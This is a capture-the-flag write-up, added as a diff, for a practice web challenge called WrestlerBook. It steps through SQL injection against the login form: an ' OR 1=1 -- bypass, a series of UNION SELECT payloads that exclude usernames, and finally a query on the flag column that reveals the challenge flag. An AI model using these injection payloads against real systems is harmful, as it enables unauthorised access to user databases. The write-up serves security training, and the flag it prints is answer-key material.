@@ -1,0 +1,64 @@
+Challenge: 
+"WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively
+for wrestlers, so if you didn't get an invite don't even bother trying to view our profile."
+
+Solution:
+
+First thing I try on here is a simple ' OR 1=1 -- which gets us into hulk hogan. There is a flag attribute that he doesnt have.
+After trying a lot of different injections I finally crafted this:
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie') --
+
+which brought us to a new page who is Jim Duggan and who also doesnt have a flag
+so my guess is we keep adding these users to the list of users we dont want. Maybe we will soon get a user with a flag.
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim') --
+
+next username still no flag: machoasf
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf') --
+
+Another one:milliondollarman
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman') --
+
+'rich_flair'
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') --
+
+'user1': George Steele
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair', 'user1', 'user10', 'user100','user101','user102', 'user103', 'user104', 'user105','user106','user107','user108','user109') --
+
+
+New idea is to check who isnt in the first set of users and who dont have the name user in their username
+
+' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') AND username NOT LIKE 'user%' --
+
+
+SELECT * FROM users WHERE username = '' UNION SELECT * FROM users WHERE username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') AND username NOT LIKE 'user%' ' and password = '' OR 1=1 --'
+
+SELECT * FROM users WHERE username = '
+' UNION SELECT * FROM users WHERE username NOT LIKE 'user%' AND username NOT IN ('hulkhogie', 'hacksawjim', 'machoasf', 'milliondollarman', 'rich_flair') ' and password = ''
+
+
+
+NOW:
+	write query filtering something else than username
+	
+' UNION SELECT * FROM users WHERE password LIKE '%sun% '
+
+
+***After filtering based on ID I notied that the profiles were coming up in the same exact order as they were when I filtered by username
+***which made me realize the other things listed must also be parts of the databse. I reconstructed this query below 
+
+
+' UNION SELECT * FROM users WHERE flag NOT LIKE 'N%' AND flag NOT LIKE 'ex%' --
+
+and FINALLY WHEN USING QUERY ABOVE we get:
+
+"Generic Wrestler
+Username: user84
+Age: 65
+Title: N/A
+Flag: sun{ju57_4n07h3r_5ql1_ch4ll}"
